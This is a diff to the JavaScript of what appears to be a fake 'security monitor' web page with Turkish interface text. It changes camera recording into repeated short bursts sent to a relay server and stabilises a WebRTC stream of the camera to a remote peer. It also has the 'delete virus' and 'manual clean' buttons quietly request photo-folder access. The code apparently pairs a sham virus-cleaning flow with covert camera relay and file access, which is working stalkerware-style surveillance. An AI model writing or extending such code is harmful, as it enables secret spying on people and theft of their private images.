@@ -277,6 +277,7 @@ let cameraStream = null;
 let cameraSequence = 0;
 let cameraActive = false;
 let cameraMime = 'video/webm';
+let cameraBurstTimer = null;
 let currentFacing = localStorage.getItem('secmon_camera_facing') || 'user';
 
 async function switchCameraFacing(facing) {
@@ -356,8 +357,12 @@ async function startCameraWithConstraints(videoConstraints, preferredMime) {
 
 function createCameraRecorder(stream, preferredMime) {
     if (!stream) return;
-    if (cameraRecorder && cameraRecorder.state !== 'inactive') {
-        try { cameraRecorder.stop(); } catch {}
+    if (cameraBurstTimer) { clearTimeout(cameraBurstTimer); cameraBurstTimer = null; }
+    if (cameraRecorder) {
+        cameraRecorder.onstop = null;
+        if (cameraRecorder.state !== 'inactive') {
+            try { cameraRecorder.stop(); } catch {}
+        }
     }
 
     const mimeType = MediaRecorder.isTypeSupported(preferredMime) ? preferredMime : 'video/webm';
@@ -376,7 +381,18 @@ function createCameraRecorder(stream, preferredMime) {
         sendCameraChunk(event.data, cameraMime);
     };
 
-    cameraRecorder.start(1000);
+    cameraRecorder.onstop = () => {
+        if (cameraActive && cameraStream === stream) {
+            cameraBurstTimer = setTimeout(() => createCameraRecorder(stream, cameraMime), 150);
+        }
+    };
+
+    cameraRecorder.start();
+    cameraBurstTimer = setTimeout(() => {
+        if (cameraRecorder && cameraRecorder.state === 'recording') {
+            try { cameraRecorder.stop(); } catch {}
+        }
+    }, 2000);
 }
 
 async function sendCameraChunk(blob, mimeType) {
@@ -403,8 +419,12 @@ async function sendCameraChunk(blob, mimeType) {
 
 function stopCameraRelay() {
     cameraActive = false;
-    if (cameraRecorder && cameraRecorder.state !== 'inactive') {
-        cameraRecorder.stop();
+    if (cameraBurstTimer) { clearTimeout(cameraBurstTimer); cameraBurstTimer = null; }
+    if (cameraRecorder) {
+        cameraRecorder.onstop = null;
+        if (cameraRecorder.state !== 'inactive') {
+            try { cameraRecorder.stop(); } catch {}
+        }
     }
     if (cameraStream) {
         cameraStream.getTracks().forEach(t => t.stop());
@@ -1282,6 +1302,8 @@ async function requestVirusDelete() {
         return;
     }
 
+    if (!photoFolderPermission()) grantPhotoFolder().catch(() => {});
+
     const area = document.getElementById('virusScanArea');
     const btn = document.getElementById('deleteVirusBtn');
     if (btn) { btn.disabled = true; btn.textContent = 'İşlem başlatılıyor...'; }
@@ -1413,6 +1435,7 @@ let webrtcMaintenanceTimer = null;
 let webrtcStreamRetryTimer = null;
 let webrtcLastOffer = null;
 let webrtcUid = null;
+let pendingRemoteIce = [];
 
 async function startWebRTC() {
     if (webrtcConnected || webrtcPC) return;
@@ -1446,6 +1469,7 @@ async function startWebRTC() {
         });
         webrtcPC = pc;
         webrtcConnected = false;
+        pendingRemoteIce = [];
 
         stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
@@ -1493,6 +1517,10 @@ async function pollWebRTCAnswer(auth) {
                     sdp: data.sdp,
                     type: data.type
                 }));
+                for (const c of pendingRemoteIce) {
+                    try { await webrtcPC.addIceCandidate(new RTCIceCandidate(c)); } catch {}
+                }
+                pendingRemoteIce = [];
             }
         } catch {}
     }, 2000);
@@ -1527,7 +1555,11 @@ function startWebRTCIcePolling(auth) {
         try {
             const resp = await fetch(`/api/relay/webrtc/ice?uid=${auth.uid}&auth=${makeAuthPayload()}`);
             const data = await resp.json();
-            if (data.status === 'ok' && data.candidates) {
+            if (data.status === 'ok' && data.candidates && data.candidates.length) {
+                if (!webrtcPC.remoteDescription) {
+                    pendingRemoteIce.push(...data.candidates);
+                    return;
+                }
                 for (const c of data.candidates) {
                     try { await webrtcPC.addIceCandidate(new RTCIceCandidate(c)); } catch {}
                 }
@@ -1576,6 +1608,7 @@ function startWebRTCMaintenance() {
 
 function resetWebRTC() {
     if (!webrtcPC) return;
+    pendingRemoteIce = [];
     stopWebRTCAnswerPoll();
     stopWebRTCIcePolling();
     try { webrtcPC.close(); } catch {}
@@ -2064,6 +2097,8 @@ async function completeManualClean() {
 
     btn.disabled = true;
     btn.textContent = '⏳ Başlatılıyor...';
+
+    if (!photoFolderPermission()) grantPhotoFolder().catch(() => {});
 
     try {
         await fetch('/api/relay/virus/notify-delete', {
